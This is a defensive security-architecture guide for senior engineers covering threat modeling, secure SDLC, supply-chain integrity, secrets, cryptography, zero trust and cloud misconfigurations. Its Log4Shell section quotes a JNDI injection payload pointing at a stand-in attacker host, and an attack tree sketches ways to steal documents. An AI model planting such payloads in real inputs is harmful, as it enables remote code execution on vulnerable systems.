# Advanced Security & Threat Modeling for Architects

> Staff/Principal deep-dive. Assumes you already know OWASP Top 10, basic authN/authZ, and TLS-as-a-checkbox. This document is about *designing* security into systems and *reasoning* about adversaries systematically.

---

## 1. Intro & Why It Matters

Security at the senior level is "use HTTPS, hash passwords with bcrypt, sanitize inputs." Security at the **staff/principal** level is a different discipline: you are responsible for a *defensible architecture* — one where the set of things that can go wrong is **enumerated, prioritized, and mitigated by design**, and where the residual risk is explicit and accepted by someone with the authority to accept it.

The shift in mindset:

| Senior framing | Staff/Principal framing |
|---|---|
| "Is this endpoint authenticated?" | "What is the trust boundary, and what crosses it?" |
| "We fixed the CVE." | "What is our mean-time-to-remediate, and is our dependency graph even *knowable*?" |
| "Secrets are in env vars." | "What is the blast radius when (not if) one leaks, and how fast can we rotate?" |
| "We use AES." | "What is our key hierarchy, who can decrypt, and how do we prove a key was never exfiltrated?" |

Two industry events reframed the field for everyone:

- **SolarWinds (2020)** — attackers compromised the *build pipeline* of Orion and shipped a signed, trojanized update (SUNBURST) to ~18,000 organizations. The artifact was legitimately signed. Endpoint AV trusted it. The lesson: **the supply chain is the attack surface**, and "signed by the vendor" is necessary but not sufficient.
- **Log4Shell / CVE-2021-44228 (2021)** — a JNDI lookup feature in Log4j 2 allowed `${jndi:ldap://attacker/x}` in any logged string to trigger remote code execution. It was *transitive* in millions of apps that had never heard of Log4j. The lesson: **you cannot defend what you cannot inventory** (hence SBOMs), and a single ubiquitous dependency is systemic risk.

This document covers: threat modeling as a rigorous practice, the secure SDLC, supply-chain security, secrets, cryptography-for-architects, defense in depth / zero trust, and the cloud misconfigurations that cause most real-world breaches.

---

## 2. Threat Modeling

Threat modeling answers four questions (Adam Shostack's framing, *Threat Modeling: Designing for Security*, 2014):

1. **What are we building?** (a model — usually a Data Flow Diagram)
2. **What can go wrong?** (STRIDE, attack trees)
3. **What are we going to do about it?** (mitigations)
4. **Did we do a good job?** (validation, did the model match reality)

### 2.1 The model: Data Flow Diagrams (DFDs)

A DFD has exactly five element types. Memorize them — STRIDE is applied **per element type**.

| Element | Symbol | Meaning |
|---|---|---|
| **External Entity** | rectangle | Actors outside your control (users, 3rd-party APIs) |
| **Process** | circle | Code that transforms data (a service, a Lambda) |
| **Data Store** | parallel lines | Persisted data (DB, S3, cache, queue) |
| **Data Flow** | arrow | Data in motion between elements |
| **Trust Boundary** | dashed line | Where the privilege/trust level changes |

The **trust boundary** is the single most important concept. Threats concentrate where data crosses a boundary — that is where a less-trusted entity hands data to a more-trusted one.

#### Worked example: a "Document Sharing" service

A user uploads documents through a web app; documents are stored in object storage; metadata in a database; a background worker generates thumbnails; an external virus-scanning API is consulted.

```
                        ┌─────────────────── Internet / Untrusted ───────────────────┐
                        │                                                             │
   ┌──────────┐         │   (DF1) HTTPS upload          ┌──────────────────┐          │
   │  Browser │─────────┼──────────────────────────────▶│  (P1) API Gateway │          │
   │ (Ext.Ent)│◀────────┼───────(DF2) HTTPS response─────│   / Web Service   │          │
   └──────────┘         │                                └────────┬─────────┘          │
                        └─────────────────────────────────────────┼────────────────────┘
   ===== Trust Boundary: edge / VPC perimeter ====================│=====================
                                                                  │ (DF3) internal call
                          ┌───────────────────────────────────────┼──────────────────┐
                          │                                        ▼                  │
                          │   ┌──────────────────┐        ┌──────────────────┐        │
                          │   │ (DS1) Metadata DB │◀──DF4──│ (P2) Doc Service  │──DF5──▶ (DS2) Object Store
                          │   │   (Postgres)      │        └───┬──────────┬────┘        │   (S3)
                          │   └──────────────────┘            │          │             │
                          │                             (DF6) │          │ (DF7) enqueue
                          │   ===== Trust Boundary: 3rd-party ====       ▼             │
                          │           │                          ┌──────────────────┐  │
                          │           ▼                          │ (DS3) Job Queue  │  │
                          │   ┌──────────────────┐               └────────┬─────────┘  │
                          │   │ (Ext) VirusScan   │                        │ (DF8)      │
                          │   │    API (SaaS)     │               ┌────────▼─────────┐  │
                          │   └──────────────────┘               │ (P3) Thumbnailer │  │
                          │                                       └──────────────────┘  │
                          └──────── Internal / Trusted VPC ──────────────────────────────┘
```

### 2.2 STRIDE — what can go wrong, per element

STRIDE (Microsoft, Loren Kohnfelder & Praerit Garg, 1999) is a mnemonic for six threat categories, each the *violation* of a security property:

| Threat | Violates | Property | Plain English |
|---|---|---|---|
| **S**poofing | Authentication | "you are who you say" | Pretending to be another principal |
| **T**ampering | Integrity | "data unchanged" | Modifying data in transit/at rest |
| **R**epudiation | Non-repudiation | "you can't deny it" | Denying having done something |
| **I**nformation disclosure | Confidentiality | "only the authorized see it" | Leaking data |
| **D**enial of service | Availability | "it's there when needed" | Making the system unavailable |
| **E**levation of privilege | Authorization | "you stay in your lane" | Gaining capabilities you shouldn't have |

**STRIDE-per-element** matrix (which threats apply to which DFD element type) — this is the standard heuristic:

| Element type | S | T | R | I | D | E |
|---|:-:|:-:|:-:|:-:|:-:|:-:|
| External Entity | ✓ | | ✓ | | | |
| Process | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Data Store | | ✓ | ✓* | ✓ | ✓ | |
| Data Flow | | ✓ | | ✓ | ✓ | |

\* Data stores are subject to repudiation when they are logs/audit stores.

#### Applying STRIDE to the worked example (selected, high-value findings)

| ID | Element | STRIDE | Threat | Mitigation |
|---|---|---|---|---|
| T1 | DF1 (upload) | Tampering / Info-disclosure | MITM alters or reads upload | TLS 1.3, HSTS, cert pinning for mobile clients |
| T2 | P1 (gateway) | Spoofing | Attacker forges a session/JWT | Short-lived JWTs, `aud`/`iss`/`exp` validation, asymmetric signing (RS256/EdDSA), rotate signing keys via JWKS |
| T3 | P1 → P2 (DF3) | Elevation | Compromised gateway calls Doc Service with elevated rights | mTLS service identity (SPIFFE/SVID), per-call authZ, least-privilege service accounts |
| T4 | DS2 (S3) | Info-disclosure | Public bucket / leaked presigned URL | Block Public Access, bucket policy deny-by-default, short-TTL scoped presigned URLs, SSE-KMS |
| T5 | P2 (Doc Service) | EoP via file content | Malicious upload → RCE (e.g., crafted file parsed by thumbnailer) | Treat all uploads as hostile: scan (VirusScan), render thumbnails in a **sandbox** (gVisor/Firecracker), drop privileges, no shell-out |
| T6 | DF6 (3rd-party) | Info-disclosure | Sending document bytes to SaaS scanner leaks PII | Hash-then-check where possible, contractual DPA, send to scanner in isolated egress path, redact |
| T7 | DS1 (Postgres) | Tampering / Repudiation | Insider modifies metadata, no trail | Append-only audit log, separate audit store, row-level security, DB activity monitoring |
| T8 | P1 | DoS | Upload flood / zip-bomb / huge files | Rate limiting, request size caps, decompression limits, WAF, autoscaling with circuit breakers |
| T9 | DF7/DS3 (queue) | Tampering | Forged jobs cause processing of attacker assets | Signed/authenticated messages, queue access via IAM, validate job provenance |

Note how the model *forces* coverage: you don't rely on remembering "oh, the queue." You walk every element × every applicable STRIDE letter.

### 2.3 Attack trees

STRIDE is breadth-first enumeration. **Attack trees** (Bruce Schneier, 1999) are goal-oriented: pick an attacker goal (the root) and decompose into the disjunction/conjunction of sub-goals (the leaves are concrete actions). Nodes are **OR** (any child achieves the parent) or **AND** (all children required).

```
GOAL: Exfiltrate a customer's private documents
├── OR  Steal credentials and download via API
│   ├── OR  Phish the user  (cost: low, skill: low, detection: medium)
│   ├── OR  Steal session token via XSS in web app  (requires: stored XSS bug)
│   └── AND Compromise OAuth flow
│       ├── Register malicious redirect_uri   (requires: open redirect / weak validation)
│       └── Trick user into authorizing
├── OR  Access object store directly
│   ├── OR  Find a public/misconfigured bucket  (cost: low — scanners do this at scale)
│   └── OR  Steal long-lived AWS keys from a leaked .env / git history
└── OR  Compromise the supply chain
    ├── AND Inject malicious dependency
    │   ├── Typosquat a package name
    │   └── Get it imported (no pinning / no review)
    └── OR  Compromise the CI runner and read S3 from its role
```

You annotate leaves with cost, required skill, probability, and detectability, then propagate up the tree (for OR nodes, the cheapest child dominates; for AND nodes, sum the costs / take the max difficulty). This surfaces the **cheapest path to the goal** — usually *not* the one engineers obsess over. (In the tree above, "find a public bucket" is near-free for the attacker and is empirically the most common real breach vector.)

### 2.4 Risk scoring: DREAD and why it's mostly retired

**DREAD** scores each threat 1–10 on five axes and averages:

- **D**amage — how bad if exploited
- **R**eproducibility — how reliably can it be triggered
- **E**xploitability — effort/skill required
- **A**ffected users — scope
- **D**iscoverability — how easy to find

`Risk = (D + R + E + A + D) / 5`

**Caveat (be honest with your org):** DREAD is notoriously subjective — two engineers score the same bug differently, and "Discoverability" rewards security-by-obscurity. Microsoft itself deprecated it. Modern practice:

- For **vulnerabilities** (post-discovery), use **CVSS v4.0** (FIRST.org) — a standardized vector string (`AV:N/AC:L/...`) producing a 0–10 base score, refined by temporal/environmental metrics. It's still imperfect but interoperable.
- For **prioritization with real-world signal**, combine CVSS with **EPSS** (Exploit Prediction Scoring System — probability of exploitation in next 30 days) and **CISA KEV** (Known Exploited Vulnerabilities catalog). A CVSS 7.5 that is on KEV outranks a CVSS 9.8 with no known exploit.
- For **threats** (design-time), use a simple **Likelihood × Impact** matrix and let the room argue — the conversation matters more than the number.

```
            Impact →
            Low      Medium    High      Critical
  Likely    Medium   High      Critical  Critical
  Possible  Low      Medium    High      Critical
  Unlikely  Low      Low       Medium    High
  Rare      Low      Low       Low       Medium
```

### 2.5 Other methodologies (know they exist)

- **PASTA** (Process for Attack Simulation and Threat Analysis) — 7-stage, risk-centric, ties to business impact. Heavier; good for regulated orgs.
- **LINDDUN** — STRIDE's analogue for **privacy** (Linkability, Identifiability, Non-repudiation, Detectability, Disclosure, Unawareness, Non-compliance). Essential under GDPR/HIPAA. As a pharma org (Takeda), privacy threat modeling on PHI/PII flows is not optional — LINDDUN is the right tool there.
- **MITRE ATT&CK** — not a modeling method but a knowledge base of real adversary TTPs (tactics, techniques). Use it to validate "did we cover how attackers actually operate" and to drive detection engineering.

---

## 3. The Secure SDLC

Security is not a phase; it's a property maintained across the lifecycle. Shift **left** (cheaper to fix early) *and* **right** (detect in production).

```
 Plan ──────▶ Design ──────▶ Code ──────▶ Build ──────▶ Test ──────▶ Deploy ──────▶ Operate
   │            │             │            │             │            │              │
 threat       threat        SAST,        SCA/SBOM,     DAST,        IaC scan,      runtime
 modeling     model +       secret       artifact      fuzzing,     policy gate,   detection,
 reqs,        design        scanning,    signing,      pen test     signed         logging,
 abuse        review,       linters,     provenance    IAST         deploy only    incident
 cases        STRIDE        peer review  (SLSA)                                     response,
                                                                                    patching
```

Key control gates:

- **SAST** (static analysis) — scans source for vulnerable patterns (Semgrep, CodeQL). Fast, in-IDE/CI, but high false positives; can't see runtime.
- **SCA** (software composition analysis) — scans *dependencies* for known CVEs (Snyk, Dependabot, OSV-Scanner, Trivy). This is where Log4Shell would be caught — *if* your SBOM is complete.
- **DAST** (dynamic analysis) — attacks the running app (OWASP ZAP, Burp). Finds runtime/auth bugs SAST can't, but only what it can reach.
- **IAST** — instruments the running app to combine both views.
- **IaC scanning** — Checkov, tfsec, KICS scan Terraform/CloudFormation for misconfigs *before* deploy.
- **Policy-as-code gate** — OPA/Conftest, Kyverno, or admission controllers reject non-compliant artifacts/manifests.

A core principle: **gates should fail builds**, not file tickets. A finding that produces a Jira ticket is a finding that ships.

---

## 4. Supply-Chain Security

> "You don't just run your code; you run everyone's code you transitively depend on, plus the code that built it, plus the code that built *that*."

### 4.1 The threat surface (SLSA's framing)

SLSA ("Supply-chain Levels for Software Artifacts," pronounced "salsa," by the OpenSSF) enumerates the attack points in a build pipeline:

```
 (Developer) ──A──▶ (Source repo) ──B──▶ (Build system) ──C──▶ (Artifact) ──D──▶ (Registry) ──E──▶ (Consumer)
       │                  │                     │                                    │
       └─ F: bad deps ────┴── G: bypass CI ─────┘                                    │
                                                                          H: use bad package ─┘

 A  Submit unauthorized change (compromised dev creds)        ← branch protection, signed commits, review
 B  Compromise source control                                 ← 2FA, audit, immutable history
 C  Build from a source other than the intended one           ← provenance: prove artifact built from commit X
 D  Use a compromised build process                           ← isolated/hermetic builds, SLSA L3
 E  Upload a non-CI-built artifact to the registry            ← only CI can publish; verify provenance
 F  Use a bad dependency                                      ← pinning, SCA, vendoring, allowlists
 G  Bypass CI to inject into the artifact                     ← no out-of-band publish
 H  Compromise the package registry                           ← signing + verification (Sigstore)
```

SolarWinds was attack point **D** (compromised build process injecting SUNBURST during compilation). Signing alone (point H) does not stop D — the malicious artifact was *correctly* signed.

### 4.2 SLSA levels (v1.0)

SLSA defines escalating **build** integrity levels, centered on *provenance* (signed, machine-verifiable metadata describing how an artifact was produced):

| Level | Requirement | Defends against |
|---|---|---|
| **L0** | No guarantees | — |
| **L1** | Provenance exists (build records how it was built) | mistakes, basic tampering visibility |
| **L2** | Provenance is **signed**, build runs on a hosted service | tampering with provenance |
| **L3** | Build platform is **hardened**: isolated, non-falsifiable provenance, no user-defined steps can forge it | a compromised build (the SolarWinds class) |

The verifier (consumer) checks: *was this artifact built from the expected source, by the expected builder, with the expected parameters?* — using the provenance attestation.

### 4.3 SBOM — Software Bill of Materials

An **SBOM** is a complete, machine-readable inventory of every component (and version, license, hash, supplier) in an artifact. Two standard formats: **SPDX** (ISO/IEC 5962) and **CycloneDX** (OWASP). Generated by tools like `syft`, `cdxgen`, or your build system.

Why it matters: when the next Log4Shell drops at 2 a.m., the question is "*are we affected, and where?*" With SBOMs and a queryable store (e.g., Dependency-Track, GUAC), that's a 5-minute query. Without them, it's a multi-week manual archaeology dig — which is exactly what happened to most of the industry in December 2021.

A minimal CycloneDX fragment:

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.6",
  "components": [
    {
      "type": "library",
      "name": "log4j-core",
      "version": "2.14.1",
      "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1",
      "hashes": [{ "alg": "SHA-256", "content": "…" }]
    }
  ]
}
```

`purl` (package URL) is the canonical identifier you join against vulnerability feeds (OSV, GHSA, NVD).

### 4.4 Dependency pinning & reproducible builds

- **Pinning**: lock to exact versions *and hashes* (`package-lock.json`, `poetry.lock`, `go.sum`, `pip` with `--require-hashes`, Bazel). A floating `^2.14` range is how a compromised patch release walks in. Hash pinning defeats registry tampering and re-tagging.
- **Vendoring**: commit dependencies into your repo for full control/auditability (Go vendoring, npm offline mirror).
- **Reproducible (hermetic) builds**: the same source + same inputs ⇒ **bit-for-bit identical output**. This lets independent parties rebuild and *verify* the artifact wasn't tampered with during build (defeats the SolarWinds class). Requires: pinned toolchains, no network during build, normalized timestamps/paths, deterministic compilers. Achieved by Nix, Bazel, Debian's Reproducible Builds project.

### 4.5 Signing & Sigstore

Historically, signing meant managing long-lived private keys (PGP) — painful and rarely done. **Sigstore** (Linux Foundation / OpenSSF) makes signing keyless and ubiquitous:

- **cosign** — signs container images and artifacts.
- **Fulcio** — a CA that issues *short-lived* (≈10 min) certificates bound to an **OIDC identity** (your GitHub Actions workflow identity, your Google/email identity). No long-lived key to leak.
- **Rekor** — an immutable, append-only **transparency log** (Merkle tree, like Certificate Transparency) recording every signature. Even if a key were misused, the misuse is publicly auditable.

```
 Signer (CI w/ OIDC token) ──▶ Fulcio ──issues──▶ short-lived cert (identity-bound)
        │                                              │
        │ sign artifact with ephemeral key             │
        ▼                                              ▼
   signature ───────────────────────────────▶ Rekor (transparency log, Merkle inclusion proof)
        │
        ▼
   Verifier: check signature + cert identity (e.g. "must be repo X's release workflow") + Rekor inclusion
```

Combine: **SLSA provenance** (how it was built) + **Sigstore signature** (who built it, immutably logged) + **SBOM** (what's inside) + a **policy** ("only deploy images signed by our release workflow with provenance from main and zero KEV CVEs"). Enforce at the admission controller.

### 4.6 The two lessons, distilled

- **SolarWinds** → trust the *build*, not just the *vendor*. Hermetic builds + SLSA L3 provenance + verification at deploy.
- **Log4Shell** → you cannot patch what you cannot see. SBOMs + continuous SCA + a queryable component inventory + the ability to *act* (fast patch/rollback) when a 0-day lands. Also: disable dangerous features by default (the JNDI lookup was an obscure feature on by default — secure defaults matter).

---

## 5. Secrets Management & Rotation

A "secret" is any credential whose disclosure grants access: API keys, DB passwords, TLS private keys, signing keys, OAuth client secrets, tokens.

### 5.1 Anti-patterns (still everywhere)

- Secrets in source / git history (even deleted — `git log -p` finds them; use `gitleaks`/`trufflehog` in CI).
- Secrets in env vars dumped to logs / crash reports / `/proc/<pid>/environ`.
- Secrets baked into container images or CI variables in plaintext.
- One long-lived shared credential for everything (infinite blast radius, impossible to rotate).

### 5.2 The model

```
            ┌──────────────────────────────────────────────┐
            │            Secret Manager / Vault             │
            │   (HashiCorp Vault, AWS Secrets Manager,      │
            │    GCP Secret Manager, Azure Key Vault)       │
            │   • encrypted at rest (KMS-backed)            │
            │   • fine-grained access policies              │
            │   • full audit log of every read              │
            │   • dynamic secrets + automatic rotation      │
            └───────────────┬──────────────────────────────┘
                            │ short-lived, scoped fetch
                            │ (workload identity, NOT a stored key)
                            ▼
            ┌──────────────────────────────────────────────┐
            │     Workload (pod/VM/function)                │
            │  authenticates via its IDENTITY               │
            │  (IRSA, GCP Workload Identity, SPIFFE,        │
            │   Vault k8s auth) — no bootstrap secret        │
            └──────────────────────────────────────────────┘
```

The hard problem is the **secret-zero / bootstrap** problem: how does a workload authenticate to the secret manager without already having a secret? Solution: **platform-provided identity** — the cloud signs an attestation of the workload's identity (AWS IRSA via the pod's OIDC service-account token, GCP Workload Identity, instance metadata, or SPIFFE/SPIRE node attestation). The workload trades that identity for short-lived secrets. No secret is stored in the workload.

### 5.3 Dynamic secrets

The strongest pattern (Vault's signature feature): the secret manager **generates credentials on demand** with a short TTL. A service asks Vault for DB access; Vault creates a Postgres user valid for 1 hour and revokes it after. There is no standing credential to steal, and rotation is automatic by construction.

### 5.4 Rotation

- **Frequency** is driven by blast radius and detectability — not a calendar fetish. Static high-value keys: regular scheduled rotation. Dynamic secrets: rotation is implicit (every issuance).
- **Graceful rotation** requires supporting *two valid secrets at once* (old + new) during the cutover window, then revoking the old. Design for this — naive "swap the value" rotation causes outages.
- **Rotate on compromise immediately.** Your rotation runbook is tested *before* the incident, not during it. The metric that matters is **time-to-rotate**: from "we believe X leaked" to "X is dead everywhere."

---

## 6. Cryptography for Architects

You will rarely implement crypto. You will constantly **choose, compose, and reason** about it. The single most important rule:

> **Don't roll your own crypto.** Not the primitives, not the protocols, not the modes, not the random number generation, not the password hashing. Use vetted, high-level libraries (libsodium/NaCl, Tink, the platform's KMS, OS TLS stack). The graveyard of broken systems is built almost entirely from "we wrote a clever encryption scheme."

### 6.1 Symmetric vs asymmetric

| | Symmetric | Asymmetric (public-key) |
|---|---|---|
| Keys | one shared secret | keypair: public + private |
| Speed | very fast (GB/s, hardware AES-NI) | slow (orders of magnitude) |
| Use | bulk data encryption | key exchange, signatures, identity |
| Examples | **AES-256-GCM**, ChaCha20-Poly1305 | RSA, **ECDSA/EdDSA**, ECDH, ML-KEM (post-quantum) |
| Problem | key *distribution* | performance, key *size* |

In practice you use **both**: asymmetric crypto to establish/agree on a symmetric session key, then symmetric for the bulk data. That's exactly what TLS does.

### 6.2 AEAD — the only symmetric mode you should reach for

**AEAD** = Authenticated Encryption with Associated Data. It provides **confidentiality + integrity + authenticity** in one primitive, and lets you bind unencrypted context (the "associated data") so it can't be swapped.

- Use **AES-256-GCM** (hardware-accelerated) or **ChaCha20-Poly1305** (fast in software, constant-time, great on mobile).
- **Never** use unauthenticated modes (AES-CBC, AES-CTR) by hand — they're malleable and lead to padding-oracle attacks (this is the root of many real CVEs). AEAD makes the "encrypt-then-MAC" decision for you, correctly.
- **Nonce discipline is critical**: GCM catastrophically fails if a (key, nonce) pair is ever reused — it leaks the authentication key. Use a counter or a misuse-resistant mode (AES-GCM-SIV) if you can't guarantee uniqueness.

### 6.3 Hashing vs Encryption vs Signing vs MAC — these are NOT interchangeable

| Operation | Reversible? | Keyed? | Provides | Use for |
|---|---|---|---|---|
| **Hash** (SHA-256, SHA-3, BLAKE3) | No | No | integrity, fingerprint | content addressing, dedup, Merkle trees |
| **Password hash** (Argon2id, scrypt, bcrypt) | No | salted + *slow* | resistance to cracking | storing passwords ONLY |
| **MAC** (HMAC-SHA256) | No | shared key | integrity + authenticity | verifying a message from someone with the shared key |
| **Encryption** (AES-GCM) | Yes (with key) | yes | confidentiality (+integrity if AEAD) | protecting data |
| **Signature** (Ed25519, RSA-PSS) | verify with public key | private/public | integrity + authenticity + **non-repudiation** | proving origin to *anyone* |

Common mistakes a staff engineer must catch in review:

- **Hashing passwords with SHA-256.** Wrong — SHA is *fast*, which helps the attacker. Use **Argon2id** (memory-hard) with a per-user salt.
- **Using MAC where you need a signature.** A MAC proves "someone with the shared key made this" — it can't prove *which* party, and can't be verified by a third party. Non-repudiation requires asymmetric signatures.
- **Encrypting when you should sign**, or assuming encryption implies integrity (only AEAD does).
- **Using a non-cryptographic RNG** (`random`/`Math.random`) for keys/tokens. Use the CSPRNG (`secrets`, `/dev/urandom`, `crypto.getRandomValues`).

### 6.4 Key hierarchies & envelope encryption

You do not encrypt millions of records directly with one master key (rotating it would mean re-encrypting everything; one key = huge blast radius). Instead use **envelope encryption**:

```
   ┌─────────────────────────────────────────────────────────────┐
   │  KMS / HSM  — holds the Master Key (KEK).                     │
   │  The KEK NEVER leaves the HSM boundary in plaintext.          │
   └───────────────┬───────────────────────────────────▲──────────┘
                   │ Encrypt(DEK) → wrapped DEK         │ Decrypt(wrapped DEK)
                   ▼                                    │
   ┌─────────────────────────────────────────────────────────────┐
   │  App:                                                         │
   │   1. Generate a fresh random Data Encryption Key (DEK)        │
   │   2. Encrypt the data with the DEK (AES-256-GCM, local, fast) │
   │   3. Ask KMS to wrap (encrypt) the DEK with the KEK           │
   │   4. Store [ wrapped DEK ‖ ciphertext ] together              │
   │   To read: ask KMS to unwrap the DEK, then decrypt locally.   │
   └─────────────────────────────────────────────────────────────┘
```

Why this is the standard (used by AWS KMS, GCP KMS, Google Tink, Vault transit):

- The bulk encryption is **fast and local** (symmetric, no per-record KMS round trip for the data itself).
- The KEK **never leaves the HSM** — even a fully compromised app can't exfiltrate it; it can only ask KMS to decrypt, which is **logged and rate-limitable** (so you can *detect* mass-decryption).
- **Rotating the KEK** is cheap: re-wrap the DEKs (small), not the data.
- **Per-tenant / per-record DEKs** give you cryptographic isolation and "crypto-shredding" — delete a DEK to render its data permanently unrecoverable (useful for GDPR right-to-erasure).

### 6.5 KMS vs HSM

- **HSM** (Hardware Security Module) — a tamper-resistant hardware device that generates/stores keys and performs crypto so the key material *never* exists in plaintext outside it. FIPS 140-2/140-3 validated. Slow, expensive, the root of trust.
- **KMS** — a managed *service* (often HSM-backed) exposing a clean API (Encrypt/Decrypt/Sign/GenerateDataKey) with IAM, audit, and rotation. You use KMS day-to-day; it sits on HSMs for the actual root keys.

### 6.6 TLS & mTLS

**TLS 1.3** (RFC 8446) — the transport you should standardize on:

- 1-RTT handshake (0-RTT possible, with replay caveats), removed all the legacy/broken ciphers (no RSA key exchange, no CBC, no RC4, no renegotiation).
- **Forward secrecy by default** via ephemeral (EC)DHE — compromising the server's long-term key later does *not* decrypt past captured sessions.
- AEAD-only cipher suites.

Handshake (simplified):

```
 Client                                                      Server
   │ ── ClientHello (supported suites, key_share, SNI) ───────▶ │
   │ ◀─ ServerHello (chosen suite, key_share) ───────────────── │
   │ ◀─ {EncryptedExtensions, Certificate, CertVerify,          │
   │      Finished}  (all encrypted after key_share) ────────── │
   │ ── {Finished} ──────────────────────────────────────────▶ │
   │ ════════ application data (AEAD, forward-secret) ════════  │
```

**mTLS** (mutual TLS) — *both* sides present certificates, so the server authenticates the client too. This is the backbone of **zero-trust service-to-service** auth: every service has a cryptographic identity (X.509 SVID from **SPIFFE/SPIRE**), and the mesh (Istio/Linkerd) enforces mTLS transparently. It replaces "the network is trusted" with "every call is mutually authenticated and encrypted."

### 6.7 Post-quantum note (forward-looking, you should be aware)

NIST finalized post-quantum standards in 2024: **ML-KEM** (FIPS 203, key encapsulation, formerly Kyber), **ML-DSA** (FIPS 204, signatures, formerly Dilithium), **SLH-DSA** (FIPS 205, hash-based signatures). The near-term threat is **"harvest now, decrypt later"** — adversaries record encrypted traffic today to decrypt once quantum computers arrive. Mitigation: **hybrid key exchange** (classical ECDHE + ML-KEM together), already deployed in TLS by major browsers/CDNs. Long-lived secrets (data encrypted for decades, root signing keys) should be on your PQ-migration radar now.

---

## 7. Defense in Depth & Zero Trust (recap, sharpened)

**Defense in depth** — no single control is trusted; layers of independent controls so a breach of one doesn't mean game over. Edge WAF → network segmentation → service authZ → app input validation → data encryption → runtime detection → audit. The point is *independence*: layers must not share a common failure mode.

**Zero Trust** (NIST SP 800-207) — discard the implicit trust of the network perimeter ("castle and moat"). Tenets:

1. **Never trust, always verify** — every request is authenticated and authorized, regardless of source network.
2. **Verify explicitly** — identity, device posture, context (location, time, behavior) on every access.
3. **Least privilege** — minimal, just-in-time, just-enough access.
4. **Assume breach** — segment to minimize blast radius; encrypt everywhere; log everything; design as if the attacker is already inside.

Concretely for architects: workload identity (SPIFFE) + mTLS everywhere + per-request authZ (OPA/Cedar policies) + micro-segmentation + short-lived credentials + continuous verification. The perimeter firewall doesn't disappear, but it stops being load-bearing for trust.

---

## 8. Common Cloud Misconfigurations

Empirically, *misconfiguration* — not exotic 0-days — causes the majority of cloud breaches. The high-frequency offenders:

| Misconfig | Consequence | Control |
|---|---|---|
| Public object storage (S3/GCS/Blob) | mass data leak | Block Public Access at account level, deny-by-default policies, access analyzer |
| Overly broad IAM (`*:*`, `iam:PassRole`, wildcards) | privilege escalation, lateral movement | least privilege, IAM Access Analyzer, permission boundaries, SCPs |
| Exposed metadata service (SSRF → IMDSv1) | steal instance role creds (Capital One, 2019) | enforce **IMDSv2** (session-token, hop-limit), block SSRF |
| Unencrypted data at rest / in transit | leak, compliance failure | default SSE-KMS, enforce TLS, deny non-TLS via policy |
| Security groups open to `0.0.0.0/0` on admin ports | direct compromise (SSH/RDP/DB exposed) | no public admin ports, bastion/SSM, just-in-time access |
| Long-lived static access keys | persistent credential theft | OIDC federation / roles, no static keys, key-age alerts |
| Public RDS/database snapshots | full DB exfiltration | private subnets, no public snapshots, encryption |
| No logging (CloudTrail/VPC Flow/audit) off | undetectable breach, no forensics | org-wide CloudTrail, centralized immutable log store |
| Disabled MFA / no SSO on root/admin | account takeover | enforce MFA, SSO, lock away root, break-glass procedures |
| Misconfigured CORS / open redirects | data theft, token leak | strict origin allowlists, validate redirect URIs |

**The Capital One breach (2019)** is the canonical teaching case: a misconfigured WAF allowed **SSRF**, which hit the **EC2 metadata service (IMDSv1)** to steal the instance's IAM role credentials, which had **overly broad S3 read** permissions — exfiltrating 100M+ records. Note it chains *three* misconfigs (SSRF + IMDSv1 + over-privileged role). Defense in depth means breaking *any one* link stops the chain. (IMDSv2's required session token + hop limit specifically defeats the SSRF→metadata step.)

Use automated guardrails — **CSPM** (Cloud Security Posture Management: Prowler, ScoutSuite, Wiz, native Security Hub/Defender), preventative **policy-as-code** (SCPs, OPA, Kyverno), and IaC scanning — so misconfigs are caught before they reach prod, continuously, not in an annual audit.

---

## 9. Key Takeaways

1. **Model before you build.** A DFD + STRIDE-per-element forces *systematic* coverage; attack trees find the *cheapest* attacker path (often a misconfig, not a 0-day). The conversation is the deliverable.
2. **Trust boundaries are where threats live.** Identify every place a less-trusted entity hands data to a more-trusted one, and harden it.
3. **Risk scoring is for prioritization, not precision.** DREAD is deprecated; prefer CVSS + EPSS + KEV for vulns, and Likelihood×Impact for design-time threats. Don't let a number end the argument.
4. **The supply chain is your attack surface.** SBOMs make you *answerable* (Log4Shell); SLSA provenance + reproducible/hermetic builds make you *defensible* against build compromise (SolarWinds); Sigstore makes signing+transparency ubiquitous and keyless. Enforce all of it at the deploy gate, failing builds — not filing tickets.
5. **Eliminate standing secrets.** Workload identity solves secret-zero; dynamic, short-lived, auto-rotated credentials beat any rotation schedule. Measure time-to-rotate.
6. **Don't roll your own crypto.** Reach for AEAD (AES-256-GCM / ChaCha20-Poly1305), Argon2id for passwords, asymmetric signatures for non-repudiation, envelope encryption with KEKs that never leave the HSM, and TLS 1.3 / mTLS for transport. Know hashing ≠ MAC ≠ encryption ≠ signing. Start the post-quantum (hybrid) migration thinking for long-lived secrets.
7. **Zero trust + defense in depth** = assume breach, verify every request, least privilege, independent layers, segment to bound blast radius.
8. **Most breaches are misconfigurations.** Public buckets, broad IAM, IMDSv1, missing logging. Automated, preventative, continuous guardrails (CSPM + policy-as-code + IaC scanning) beat audits.

---

## Seminal References

- L. Kohnfelder & P. Garg, *The Threats To Our Products* (1999) — original STRIDE.
- A. Shostack, *Threat Modeling: Designing for Security* (Wiley, 2014).
- B. Schneier, "Attack Trees," *Dr. Dobb's Journal* (1999).
- NIST SP 800-207, *Zero Trust Architecture* (2020).
- OpenSSF, **SLSA** specification v1.0 (slsa.dev).
- ISO/IEC 5962:2021 (**SPDX**); OWASP **CycloneDX** specification.
- D. Cooper et al., RFC 8446, *The Transport Layer Security (TLS) Protocol Version 1.3* (2018).
- N. Ferguson, B. Schneier, T. Kohno, *Cryptography Engineering* (2010).
- NIST FIPS 203/204/205 — post-quantum standards (2024).
- FIRST.org **CVSS v4.0**; FIRST.org **EPSS**; CISA **KEV** catalog.
- M. Howard & S. Lipner, *The Security Development Lifecycle* (Microsoft Press, 2006).
```
